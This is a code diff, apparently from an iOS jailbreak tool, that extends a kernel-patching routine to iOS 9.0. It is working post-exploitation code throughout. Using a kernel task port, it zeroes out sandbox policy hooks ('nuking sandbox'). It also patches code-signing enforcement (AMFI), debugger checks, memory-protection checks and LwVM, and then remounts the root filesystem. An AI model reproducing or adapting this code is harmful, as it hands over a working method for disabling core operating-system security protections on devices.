@@ -256,6 +256,8 @@ bool unsandbox8(mach_port_t tfp0, uint32_t kernel_base, bool untether_on) {
     
     uint8_t* kdata = NULL;
     size_t ksize = 0xFFE000;
+    if ([system_version hasPrefix:@"9.0"])
+        ksize = 32*1024*1024;
     kdata = malloc(ksize);
     dump_kernel_8(tfp0, kernel_base, kdata, ksize);
     if (!kdata) {
@@ -267,54 +269,98 @@ bool unsandbox8(mach_port_t tfp0, uint32_t kernel_base, bool untether_on) {
     uint32_t sbopsoffset = find_sbops(kernel_base, kdata, ksize);
 
     olog("nuking sandbox at 0x%08lx\n", kernel_base + sbopsoffset);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0,tfp0);
-    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0,tfp0);
+    if ([system_version hasPrefix:@"9.0"]) {
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0,tfp0);
+    } else {
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0,tfp0);
+        kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0,tfp0);
+    }
     olog("nuked sandbox\n");
     olog("let's go for code exec...\n");
     
     uint32_t tfp0_patch = find_tfp0_patch(kernel_base, kdata, ksize);
     uint32_t proc_enforce8 = find_proc_enforce8(kernel_base, kdata, ksize);
     uint32_t cs_enforcement_disable_amfi = find_cs_enforcement_disable_amfi8(kernel_base, kdata, ksize);
-    uint32_t PE_i_can_has_debugger_1 = find_i_can_has_debugger_1(kernel_base, kdata, ksize);
-    uint32_t PE_i_can_has_debugger_2 = find_i_can_has_debugger_2(kernel_base, kdata, ksize);
     //uint32_t vm_fault_enter = find_vm_fault_enter_patch_84(kernel_base, kdata, ksize);
     uint32_t vm_map_enter8 = find_vm_map_enter_patch8(kernel_base, kdata, ksize);
     uint32_t vm_map_protect8 = find_vm_map_protect_patch8(kernel_base, kdata, ksize);
-    uint32_t mount_common = find_mount8(kernel_base, kdata, ksize);
     uint32_t mapForIO = find_mapForIO(kernel_base, kdata, ksize);
     uint32_t sandbox_call_i_can_has_debugger = find_sandbox_call_i_can_has_debugger8(kernel_base, kdata, ksize);
     uint32_t csops8 = find_csops8(kernel_base, kdata, ksize);
     uint32_t csops2 = find_csops2(kernel_base, kdata, ksize);
+    uint32_t mount_common;
+    uint32_t PE_i_can_has_debugger_1;
+    uint32_t PE_i_can_has_debugger_2;
+    if ([system_version hasPrefix:@"9.0"]) {
+        mount_common = find_mount_common(kernel_base, kdata, ksize);
+        PE_i_can_has_debugger_1 = find_PE_i_can_has_debugger_1();
+        PE_i_can_has_debugger_2 = find_PE_i_can_has_debugger_2();
+    } else {
+        mount_common = find_mount8(kernel_base, kdata, ksize);
+        PE_i_can_has_debugger_1 = find_i_can_has_debugger_1(kernel_base, kdata, ksize);
+        PE_i_can_has_debugger_2 = find_i_can_has_debugger_2(kernel_base, kdata, ksize);
+    }
 
     olog("patching tfp0 at 0x%08x\n", kernel_base + tfp0_patch);
     kwrite_uint32(kernel_base + tfp0_patch, 0xbf00bf00, tfp0);
@@ -326,10 +372,10 @@ bool unsandbox8(mach_port_t tfp0, uint32_t kernel_base, bool untether_on) {
     kwrite_uint8(kernel_base + cs_enforcement_disable_amfi, 1, tfp0);
     kwrite_uint8(kernel_base + cs_enforcement_disable_amfi - 4, 1, tfp0);
     
-    olog("patching PE_i_can_has_debugger_1 at 0x%08x\n",PE_i_can_has_debugger_1);
+    olog("patching PE_i_can_has_debugger_1 at 0x%08x\n", kernel_base + PE_i_can_has_debugger_1);
     kwrite_uint32(kernel_base + PE_i_can_has_debugger_1, 1, tfp0);
     
-    olog("patching PE_i_can_has_debugger_2 at 0x%08x\n",PE_i_can_has_debugger_2);
+    olog("patching PE_i_can_has_debugger_2 at 0x%08x\n", kernel_base + PE_i_can_has_debugger_2);
     kwrite_uint32(kernel_base + PE_i_can_has_debugger_2, 1, tfp0);
 
     //olog("patching vm_fault_enter at 0x%08x\n", kernel_base + vm_fault_enter);
@@ -355,6 +401,30 @@ bool unsandbox8(mach_port_t tfp0, uint32_t kernel_base, bool untether_on) {
     
     olog("patching sandbox_call_i_can_has_debugger at 0x%08x\n", kernel_base + sandbox_call_i_can_has_debugger);
     kwrite_uint32(kernel_base + sandbox_call_i_can_has_debugger, 0xbf00bf00, tfp0);
+
+    if ([system_version hasPrefix:@"9.0"]) {
+        uint32_t amfi_file_check_mmap = find_amfi_file_check_mmap(kernel_base, kdata, ksize);
+        if (amfi_file_check_mmap != 0) {
+            olog("patching amfi_file_check_mmap at 0x%08x\n", kernel_base + amfi_file_check_mmap);
+            kwrite_uint32(kernel_base + amfi_file_check_mmap, 0xbf00bf00, tfp0);
+        } else {
+            olog("find_amfi_file_check_mmap unsuccessful, continuing anyway\n");
+        }
+
+        uint32_t lwvm_call = find_lwvm_call(kernel_base, kdata, ksize);
+        uint32_t lwvm_call_offset = find_lwvm_call_offset(kernel_base, kdata, ksize);
+        if (lwvm_call == 0) {
+            olog("find_lwvm_call unsuccessful, continuing anyway\n");
+        }
+        if (lwvm_call_offset == 0) {
+            olog("find_lwvm_call_offset unsuccessful, continuing anyway\n");
+        }
+        olog("unslid lwvm_call at 0x%08x\n", UNSLID_BASE + lwvm_call);
+        olog("unslid lwvm_call_off at 0x%08x\n", UNSLID_BASE + lwvm_call_offset);
+        olog("patching lwvm_call at 0x%08x\n", kernel_base + lwvm_call);
+        olog("patching lwvm_call_off at 0x%08x\n", kernel_base + lwvm_call_offset);
+        kwrite_uint32(kernel_base + lwvm_call, kernel_base + lwvm_call_offset, tfp0);
+    }
 
     olog("[*] remounting rootfs\n");
     char* nmr = strdup("/dev/disk0s1s1");
